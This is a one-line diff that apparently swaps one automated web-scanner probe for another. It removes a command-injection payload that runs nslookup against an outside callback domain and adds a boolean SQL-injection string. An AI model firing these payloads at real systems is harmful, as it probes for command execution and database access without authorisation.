@@ -1,1 +1,1 @@
-&nslookup -q=cname hitusfhblvxrk14d28.bxss.me&'\"`0&nslookup -q=cname hitusfhblvxrk14d28.bxss.me&`'
+-1" OR 2+702-702-1=0+0+0+1 -- 
